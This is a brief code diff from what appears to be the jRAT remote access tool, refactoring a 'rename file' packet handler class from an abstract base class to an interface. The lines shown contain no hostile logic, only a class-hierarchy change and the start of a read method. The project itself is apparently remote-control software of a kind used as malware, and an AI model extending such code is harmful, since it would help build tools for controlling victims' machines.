@@ -1,13 +1,13 @@
 package jrat.module.fs.packets;
 
 import jrat.client.Connection;
-import jrat.client.packets.incoming.AbstractIncomingPacket;
+import jrat.client.packets.incoming.IncomingPacket;
 import jrat.common.codec.Hex;
 
 import java.io.File;
 
 
-public class Packet47RenameFile extends AbstractIncomingPacket {
+public class Packet47RenameFile implements IncomingPacket {
 
 	public void read(Connection con) throws Exception {
 		String file = con.readLine();
